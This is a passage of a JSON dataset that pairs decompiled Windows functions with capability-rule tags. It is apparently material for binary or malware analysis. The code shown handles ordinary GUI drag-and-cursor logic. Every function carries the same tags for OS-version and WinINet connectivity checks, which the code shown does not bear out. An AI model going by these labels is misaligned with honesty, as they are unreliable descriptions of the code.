        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0044d29c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0044d6e4();\n    iVar2 = sub.user32.dll_GetWindow(hWnd, 4);\n    if (iVar2 != *(**0x49291c + 0x30)) {\n        iVar2 = fcn.0044c724();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.00457a28();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.00457a28();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004047cc();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.00457a28();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.00457a28();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0044d230, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.0040483c(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004047cc();\n                if ((((cVar1 == '\\0') || (*(*(*0x497c7c + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.00457a28(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 743
    },
    "0044d47c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0044d47c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x497ca0 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x49291c + 0xbc)) {\n            (**(**0x497ca4 + 8))();\n            iVar4 = *(*0x497ca0 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.004197d8();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.00457a28();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0044d438(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.0040483c(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.0040483c();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0044cba8();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x497ca4)[2]) {\n                var_18h = fcn.0044cc60(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0044d29c(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 683
    },
    "0044d5d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d5d0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x497ca0 == 0) {\n            *0x497ca0 = fcn.00404610();\n        }\n        iVar1 = fcn.00419834();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.004196cc();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.00419680();\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0044d79c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044d79c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x497c7c + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.004563dc(),  iVar2 != 0)) {\n        iVar2 = fcn.004563dc();\n        if ((iVar2 == 1) && (iVar2 = fcn.004197d8(),  iVar2 == *(*0x497c7c + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.0044e23c();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.00419834();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.004563f0();\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "0044d83c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d83c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x497c98 == '\\0') &&\n        (uVar9 = *0x497c88 - *in_EAX >> 0x1f,  (*0x497c88 - *in_EAX ^ uVar9) - uVar9 < *0x497c94)) &&\n       (uVar9 = *0x497c8c - in_EAX[1] >> 0x1f,  (*0x497c8c - in_EAX[1] ^ uVar9) - uVar9 < *0x497c94)) {\n        return;\n    }\n    iVar10 = 0x44d897;\n    iVar7 = fcn.0044d710(*0x497c78);\n    if ((*0x497c98 == '\\0') && (*0x497c9c != 0)) {\n        iVar10 = *0x497c8c;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.004595b0(iVar10);\n    }\n    if (*(*0x497c78 + 0x8f) == '\\0') {\n        *0x497c98 = '\\x01';\n    }\n    else {\n        *0x497c98 = '\\x02';\n    }\n    if (iVar7 != (*0x497c7c)[2]) {\n        fcn.0044d760();\n        if (*0x497c7c == NULL) {\n            return;\n        }\n        (*0x497c7c)[2] = iVar7;\n        (*0x497c7c)[3] = iVar10;\n        piVar1 = *0x497c7c;\n        (*0x497c7c)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.0044d760();\n        if (*0x497c7c == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x497c7c;\n    (*0x497c7c)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x497c7c)[2] != 0) {\n        fcn.0044f804();\n        piVar1 = *0x497c7c;\n        (*0x497c7c)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.0044d760(in_EAX[1]);\n    (**(**0x497c7c + 4))();\n    if (*0x497c9c != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x497c7c + 1) != '\\0')) {\n            fcn.0045958c();\n            if (*(*0x497c9c + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.004595b0(iVar10);\n            }\n            else {\n                fcn.004596ac();\n            }\n        }\n        else {\n            fcn.00459720();\n            uVar8 = fcn.00443698();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.00443698();\n    sub.user32.dll_SetCursor();\n    if (*0x497c98 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.0040483c(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0044d79c();\n            (*0x497c7c)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.0040483c();\n                *(*0x497c7c + 0x17) = uVar5;\n            }\n            else {\n                fcn.0044f804();\n                uVar5 = fcn.0040483c();\n                *(*0x497c7c + 0x17) = uVar5;\n            }\n        }\n        if ((*0x497c7c != NULL) && (cVar6 = fcn.004098cc(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x497c7c + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x497c7c + 0x34))();\n            }\n            (**(**0x497c7c + 0x30))();\n            piVar3 = *0x497c7c;\n            piVar2 = *0x497c7c + 0x1a;\n            piVar1 = *0x497c7c + 0x14;\n            (*0x497c7c)[0x19] = (*0x497c7c)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1280
    },
    "0044db24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044db24(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x497c7c = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x497c88);\n    piVar1 = *0x497c7c;\n    (*0x497c7c)[4] = *0x497c88;\n    piVar1[5] = *0x497c8c;\n    *0x497c90 = sub.user32.dll_GetCursor();\n    *0x497c84 = fcn.0044cd04();\n    *0x497c94 = param_1;\n    cVar2 = fcn.004047cc();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x497c98 = '\\0';\n        }\n        else {\n            *0x497c98 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x497c98 = '\\0';\n        }\n        else {\n            *0x497c98 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x497c9c = (**(**0x497c7c + 8))();\n    if (*0x497c9c != 0) {\n        iVar3 = *0x497c8c;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.004595b0(iVar3);\n    }\n    *0x497ca4 = fcn.00404610();\n    if (*0x497c98 != '\\0') {\n        fcn.0044d83c();\n    }\n    return;\n}\n",
        "token_count": 652
    },
    "0044dc94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044dc94(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x44de39;\n    iStack60 = *in_FS_OFFSET;\n    *0x497c78 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x497c80 = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x44dcdb;\n        puStack52 = &stack0xfffffffc;\n        fcn.0040483c();\n        if (*0x497c78 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x44dd09;\n            var_8h = fcn.0044cf28();\n            *0x497c80 = 1;\n        }\n    }\n    else {\n        fcn.0040483c();\n        if (*0x497c78 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0044d038();\n            *0x497c80 = 1;\n        }\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004047cc(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0044dc94::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00418360();\n                puStack64 = 0x44ddda;\n                fcn.0044f754();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00418360();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.00457a28();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.0044db24();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 818
    },
    "0044de58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044de58(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x497c7c + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x497c98 == '\\x02')) {\n        cVar1 = (**(**0x497c78 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x497c78)[0x25] != 0)) {\n            if ((*0x497c78)[0x25] != 0) {\n                uVar2 = fcn.0040483c();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "0044decc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044decc(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0044decc::var_1h + 1;\n    puStack44 = &fcn.0044decc::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x497c7c == NULL) || (*(*0x497c7c + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x44e1e1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x497ca8 = *0x497c7c;\n    uStack48 = 0x44e16f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x497c7c + 5) = 1;\n    *(*0x497c7c + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0044cd4c();\n    if (*0x497c98 == '\\x02') {\n        piVar5 = fcn.004047f0();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x497c7c)[2] == 0) {\ncode_r0x0044dfa4:\n        var_dh = (*0x497c7c)[5];\n    }\n    else {\n        cVar2 = fcn.004047cc();\n        if (cVar2 == '\\0') goto code_r0x0044dfa4;\n        var_dh = (*0x497c7c)[7];\n    }\n    uStack60 = 0x44dfbb;\n    cVar2 = fcn.0044de58(&fcn.0044decc::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x497c98 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x0044dfe3:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0044dfef;\n            }\n        }\n        else if (*0x497c98 != '\\0') {\n            cVar2 = fcn.0044d760();\n            if (cVar2 != '\\0') goto code_r0x0044dfe3;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044dfef:\n    if (*0x497c98 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.0043b1a8();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.0043fee8();\n            }\n            uStack60 = 0x44e03e;\n            fcn.00450f7c(*0x497c7c);\n        }\n    }\n    else if (*0x497c9c == 0) {\n        uStack60 = 0x44e060;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.00459720();\n    }\n    *0x497c78 = 0;\n    *0x497c7c = NULL;\n    if ((*0x497ca8 != NULL) && ((*0x497ca8)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x497ca8)[4] = 0;\n            (*0x497ca8)[5] = 0;\n        }\n        puVar1 = *0x497ca8;\n        uStack60 = 0x44e113;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x497ca8 + 4;\n        fcn.0044d62c(arg_8h, (*0x497ca8)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x497ca8 == NULL) {\n            *0x497ca8 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x44e176;\n    uStack48 = 0x44e131;\n    fcn.00404640();\n    *0x497ca4 = 0;\n    if (*0x497ca8 != NULL) {\n        *(*0x497ca8 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x497ca8)();\n    }\n    *0x497c7c = NULL;\n    return;\n}\n",
        "token_count": 1278
    },
    "0044e1f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e1f0(void)\n\n{\n    if (*0x497c7c != 0) {\n        fcn.0044decc();\n    }\n    *0x497c78 = 0;\n    return;\n}\n",
        "token_count": 54
    },
    "0044e288": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e288(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00404610();\n        *in_EAX = iVar1;\n    }\n    fcn.00419680();\n    return;\n}\n",
        "token_count": 74
    },
    "0044e2b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e2b0(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.0041991c();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00404640();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0044e3bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e3bc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x44e3cc;\n    var_8h = fcn.00419b48();\n    uStack24 = 0x44e45a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x44e3f7;\n            var_ch = fcn.004197d8();\n            puStack32 = 0x44e402;\n            cVar1 = fcn.00424d58();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x44e432;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0044e53c();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x44e439;\n                uStack36 = 0x44e431;\n                fcn.00424db4();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44e461;\n    uStack24 = 0x44e459;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 456
    },
    "0044e494": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e494(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x44e4ad;\n        fcn.00424f44();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x44e4c5;\n            iVar1 = fcn.00419b48();\n            uStack20 = 0x44e519;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0044e300();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.00419680();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x44e520;\n            uStack20 = 0x44e518;\n            fcn.00419bac();\n            return;\n        }\n        puStack16 = 0x44e52e;\n        fcn.00424f48();\n        puStack16 = 0x44e536;\n        fcn.0044e588();\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0044e53c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e53c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.00424f48();\n        fcn.00419b5c();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0044e6f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044e6f4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0044e6f4::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x44e7c1;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x44e729;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x44e73b;\n        cVar1 = fcn.0040483c();\n        if ((((cVar1 != '\\0') && (*(**0x49291c + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0044e6f4::var_8h;\n            fcn.00432f58();\n            fcn.0040af7c(arg_8h);\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x44e7c8;\n    iStack56 = 0x44e7b8;\n    fcn.0040546c();\n    iStack56 = 0x44e7c0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 493
    },
    "0044eb2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044eb2c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x44ec1c;\n    iVar1 = fcn.00423d9c();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x44fd74;\n    *(in_EAX + 0x61) = *0x44ec20;\n    iVar1 = fcn.0044e5b4();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x450d38;\n    iVar1 = fcn.0045d0dc();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x452810;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 